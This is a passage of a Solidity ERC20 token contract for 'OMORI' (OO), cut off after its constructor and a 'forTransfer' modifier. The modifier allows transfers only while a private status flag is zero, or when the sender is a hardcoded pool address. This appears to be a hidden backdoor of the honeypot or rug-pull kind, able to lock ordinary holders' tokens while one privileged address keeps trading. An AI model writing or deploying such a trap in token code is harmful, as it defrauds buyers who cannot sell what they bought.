...
contract OmoriToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenOO_totalSupply;
    uint256 private _tokenOO_status = 0;
    uint256 public stakingPoolOOStatus = 0;

    string private _tokenOO_name;
    string private _tokenOO_symbol;

    address private _poolOOAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenOO_name = "OMORI";
        _tokenOO_symbol = "OO";
        _tokenOO_totalSupply = 44500 * 10 ** 18;
        _balances[msg.sender] = _tokenOO_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolOOAddress || _tokenOO_status == 0);
        _;
    }
